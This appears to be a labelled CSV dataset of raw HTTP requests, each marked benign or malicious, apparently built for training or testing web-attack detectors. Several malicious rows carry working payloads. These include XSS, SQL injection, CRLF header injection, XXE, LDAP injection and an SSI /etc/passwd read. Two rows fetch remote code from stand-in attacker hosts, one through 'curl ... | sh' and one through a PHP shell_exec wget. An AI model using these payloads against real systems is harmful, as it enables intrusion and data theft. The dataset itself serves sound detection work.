label,text
benign,"GET /posts/2023/08/15/tech-insights?comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/111.0.5563.110 Chrome/111.0.5563.110 Safari/537.36
Connection: keep-alive"
benign,"GET /shop/deals/spring-sale?category=clothing&sort=popular HTTP/1.1
Host: trendzstyles.com
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Referer: https://trendzstyles.com/
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1"
malicious,"GET /user/search?search=%26lt%3Bscript%26gt%3Balert%28%26%2339%3BXSS_%20Vulnerability_Found%26%2339%3B%29%26lt%3B%2Fscript%26gt%3B HTTP/1.1
Host: nextgen-social-network.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Referer: https://nextgen-social-network.org/home
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
benign,"DELETE /api/v4/teams/alpha-987b HTTP/1.1
Host: smart-home-automation.ai
Authorization: Bearer l93kKl09cVz8E6fKwepf
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Connection: keep-alive"
benign,"GET /v2/products/list?category=electronics&available=true HTTP/1.1
Host: inventory-hub.net
Accept: application/json
X-Api-Token: 9a8c1b7fe3420d4e5fb1782940a6a1c7
User-Agent: curl/7.79.1
Accept-Encoding: gzip, deflate"
benign,"GET /images/logo.svg HTTP/1.1
Host: portal-secureuser.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.7
Cache-Control: max-age=0
Connection: close"
benign,"POST /api/v4/accounts/password/reset-request HTTP/1.1
Host: global-finance-hub.co
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1
Origin: https://global-finance-hub.co
Content-Length: 44

{""email"":""marie.leblanc@global-finance-hub.co""}"
malicious,"GET /blog/article/view?category=2%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Cookie: user_sid=xyz789abc123; theme=dark"
malicious,"GET /go?target=https%3A%2F%2Fconnect.financial-data-cloud.ai%2Fuser%2Fsettings%3Flang%3Den%250d%250aSet-Cookie%3A%20premiumUser%3Dyes HTTP/1.1
Host: login.financial-data-cloud.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Referer: https://connect.financial-data-cloud.ai/welcome
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
malicious,"GET /account/login%0d%0aSet-Cookie:%20auth=malicious%0d%0aContent-Length:%2016%0d%0a%0d%0a<script>bad()</script> HTTP/1.1
Host: member-portal-authed.cloud
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Charset: utf-8, iso-8859-1;q=0.5
Connection: keep-alive"
benign,"GET /ping HTTP/1.1
Host: metrics-dashboard.aiobservability.io
User-Agent: Python-urllib/3.10
Accept: */*
DNT: 1
Connection: close"
benign,"PUT /profiles/mark_smith HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 66
Cookie: session_id=MTIzNDU2Nzg5MDEyMzQ1Njc4OTA=
Connection: keep-alive

{""bio"": ""Retail enthusiast &amp; buyer of &lt;b&gt;smart gadgets&lt;/b&gt;.""}"
benign,"POST /poll/42/vote HTTP/1.1
Host: regional-news-network.tv
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://regional-news-network.tv/poll/42
Accept-Language: en-US,en;q=0.8

poll_id=42&choice_id=3"
benign,"GET /products/search?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: sessionId=3f7a84eacd9a47c8b9bc4d5f073b5d07; theme=dark
Connection: keep-alive"
benign,"GET /static/css/theme-dark.css HTTP/1.1
Host: developer-tools-zone.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/css,*/*;q=0.1
Accept-Language: en-US,en;q=0.5
Referer: https://developer-tools-zone.io/dashboard
Connection: keep-alive"
malicious,"POST /api/executeTask HTTP/1.1
Host: control-node.central-iot.solutions
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 128
Connection: keep-alive

{""taskId"":""update_firmware"",""targetHost"":""192.168.5.10 && curl http://malicious-server.net/exploit.sh | sh"",""priority"":7}"
malicious,"POST /api/v2/rendered HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json
Pragma: no-cache
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36
Sec-CH-UA: "" Not A;Brand"";v=""99"", ""Chromium"";v=""91"", ""Google Chrome"";v=""91""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Content-Length: 207

{""content"":{""main"": ""Latest posts"", ""debug"": ""<!--#exec cmd=\""c\""\""a\""\""t /etc/p\""\""as\""\""swd\"" -->""}}"
benign,"GET /sitemap.xml HTTP/1.1
Host: global-tech-hub.net
Accept: application/xml, text/xml
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"GET /rss HTTP/1.1
Host: family-cooks-community.org
Accept: application/rss+xml
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Referer: https://family-cooks-community.org/recipes/top-rated
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"GET /api/check/username?username=alpha_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: nxtgen-user-auth.org
User-Agent: Wget/1.20
Accept: application/json
X-Requested-With: XMLHttpRequest
Accept-Charset: utf-8"
benign,"POST /send-message HTTP/1.1
Host: harmony-travelers.club
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Referer: https://harmony-travelers.club/contact
Origin: https://harmony-travelers.club
Cookie: travel_session=ff9f93jf0932jf9324jf
Accept-Language: en-US,en;q=0.7
Connection: keep-alive

name=Noah+Grayson&email=noah.grayson%40harmony-travelers.club&subject=Travel+package+questions&message=Hello%2C+could+you+provide+details+on+the+itinerary+for+the+Mediterranean+cruise%3F"
benign,"GET /resource/load?file=documents/manuals/user_guide.pdf HTTP/1.1
Host: corporate-info-portal.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
Accept: application/pdf
Accept-Language: en-GB,en;q=0.8
Referer: https://corporate-info-portal.biz/dashboard
Connection: close"
benign,"GET /api/v2/users/update-status?user=henry.jenkins HTTP/1.1
Host: example.com:8080
Accept: application/json
User-Agent: curl/7.81.0
X-Requested-With: XMLHttpRequest
DNT: 1
Connection: close"
benign,"GET /products/outdoor/fishing/reels HTTP/1.1
Host: naturegear-warehouse.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Referer: https://www.naturegear-warehouse.biz/
Connection: keep-alive"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 162
Accept: application/json
User-Agent: Python-urllib/3.9

{""query"":""latest gadgets"",""filters"":{""promo"":""\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029""}}"
malicious,"POST /user/api/profile HTTP/1.1
Host: secure-member-access.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1
Content-Type: application/json
Accept: application/json
X-CSRF-Token: 497f1df612a7453196c0cb881a2e9b64
Referer: https://secure-member-access.net/profile/edit
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Content-Length: 103

{""username"":""testuser"",""email"":""test@user.com"",""is_Admin"":true,""plan_id"":""free""}"
malicious,"POST /feedback/api/v2/send HTTP/1.1
Host: feedback-collector.cloudapp.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/xml, */*;q=0.9
Content-Type: application/xml
Content-Length: 207
Connection: close

<?xml version=""1.0""?>
<!DOCTYPE feedback [
<!ENTITY xxe_ssrf SYSTEM ""http://10.1.1.1:8080/status"" >
]>
<feedback>
  <entry>&xxe_ssrf;</entry>
</feedback>"
benign,"POST /dynamic-scripts/session-check.js HTTP/1.1
Host: secure-session-control.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36
Content-Type: application/javascript
Content-Length: 43
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close

console.log('Session check script executed successfully');"
benign,"GET /help/search?q=how+to+reset+password+%26+security+tips&ref=homepage%22banner HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /register/api/v1/new HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Authorization: Bearer cd3f21fa-724b-49e9-99e0-abcde12345fa
Content-Type: application/xml
Accept: application/xml
Content-Length: 208
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<DeviceRegistration>
  <DeviceId>dev-8492beta</DeviceId>
  <Model>Pixel 7 Pro</Model>
  <OwnerEmail>user42@cloud-data-services.ai</OwnerEmail>
  <OSVersion>Android 13</OSVersion>
  <Features>
    <Feature>Bluetooth LE</Feature>
    <Feature>5G Connectivity</Feature>
  </Features>
</DeviceRegistration>"
benign,"GET /sitemap.xml HTTP/1.1
Host: greenfield-realty-services.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: application/xml, text/xml
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"POST /app/ldap/search HTTP/1.1
Host: directory-access.secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 58

user_id=validuser%29%28objectClass%3D*%29&attributes=%2A"
benign,"GET /gallery/nature/2024-06 HTTP/1.1
Host: vibrant-photography-archive.net
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
benign,"POST /api/v2/users/create HTTP/1.1
Host: api.user-management-services.net
User-Agent: curl/7.88.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
X-Forwarded-For: 192.168.1.101
Connection: close

username=charles_m&password=bigsecret&referrer="
benign,"GET /feeds/latest-news.atom HTTP/1.1
Host: blockchain-insider.tech
Accept: application/atom+xml, */*;q=0.1
User-Agent: curl/7.79.1
Referer: https://blockchain-insider.tech/market-trends
Connection: close"
benign,"GET /robots.txt HTTP/1.1
Host: green-energy-solutions.biz
User-Agent: GreenAuditBot/2.0 (+http://green-energy-solutions.biz/bot)
Accept-Encoding: br, gzip, deflate
Cache-Control: no-cache
Connection: close"
benign,"GET /v3/data/xml/books HTTP/1.1
Host: nextgen-media-publishing.ai
Accept: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Authorization: Bearer token-XX2354fghj9832
Cache-Control: max-age=3600
DNT: 1
Connection: keep-alive"
malicious,"POST /forms/submit HTTP/1.1
Host: event-registration.online
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.7
Content-Length: 109
Referer: https://event-registration.online/form
Connection: keep-alive

details=Looking+forward+to+the+event!+%3C%3Fphp+echo+shell_exec%28%27wget+http%3A%2F%2Fattacker.com%2Fshell.php+-O+%2Ftmp%2Fsh.php%27%29%3B+%3F%3E"
benign,"PUT /v2/account/profile HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: application/json, text/plain, */*
Content-Length: 59
User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; Pixel 4 Build/RQ2A.210305.006)
Authorization: Bearer d12f39ee-8f87-4e92-a0d9-05e7e7c613ab
Origin: https://secure-user-portal.net
Connection: keep-alive

{""bio"":""Avid traveler &amp; photographer, fans of &lt;img&gt; tags &amp; layouts.""}"
benign,"GET /find?q=latest+indie+music+albums HTTP/1.1
Host: streamwave-music.ai
Accept: text/html
Referer: https://streamwave-music.ai/
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) Gecko/20100101 Firefox/112.0
Connection: close"
benign,"GET /search?q=best+laptop+deals+2024 HTTP/1.1
Host: tech-hyperstore.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Safari/537.36
Accept: text/html
Referer: https://tech-hyperstore.io/home
Connection: keep-alive"
benign,"GET /static/v3/assets/css/main.css?v=3d%4a%5b%6C%7d45 HTTP/1.1
Host: assets.online-retail-store.biz
Accept: text/css,*/*;q=0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"PUT /accounts/9823/preferences HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer vyeQd8h7kjTjaXeLp28MfrBoCD47GoPm
Origin: https://online-retail-store.biz
X-Requested-With: XMLHttpRequest
Accept: application/json
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Content-Length: 76

{""currency"":""USD"",""language"":""en"",""defaultShipping"":""2ndDayAir"",""emailOffers"":true}"
benign,"GET /api/v1/weather/forecast/hourly?location=37.7749,-122.4194 HTTP/1.1
Host: global-weather-info.org
Accept: application/json
App-Secret: 84bfe2105d964a5b91fa73c8f2ea1e4c
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0
Cache-Control: max-age=0"
benign,"GET /products;category=books/reviews;lang=en_US HTTP/1.1
Host: book-review-hub.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /api/session HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Accept: application/json
Origin: https://console.cloud-data-services.ai
X-Requested-With: FetchAPIClient
X-CSRF-Token: a8f9b2dc134efa7d0e5c
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Content-Length: 88

{""email"": ""oliver.dawson@datawise.ai"", ""password"": ""GreenLeaf!42""}"
benign,"GET /member/profile/edit HTTP/1.1
Host: fitness-tracker-app.io
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: keep-alive
Cookie: user_sid=829cc1a2e1f9479fb9b23e3d; last_login=1687552112; theme=dark; location=us-west-2
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Linux; U; Android 13; en-US; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.0.0 Mobile Safari/537.36"
benign,"PUT /api/v3/blog/posts/8420 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer aBcDeFgHiJkLmNoPqRsTuVwXyZ123456
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Connection: close
Content-Length: 147

<?xml version=""1.0"" encoding=""UTF-8""?>
<post>
  <title>Understanding HTTP Protocols</title>
  <content>Updated content on HTTP methods and headers.</content>
  <tags>
    <tag>http</tag>
    <tag>networking</tag>
  </tags>
</post>"
benign,"HEAD /index.html HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.85.0
Accept: */*
Cache-Control: no-cache
Pragma: no-cache
Connection: close"
benign,"POST /poll/v45/vote_submit HTTP/1.1
Host: townhall-discuss.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://townhall-discuss.info
Referer: https://townhall-discuss.info/poll/v45
Connection: keep-alive

poll_id=45&choice_id=4"
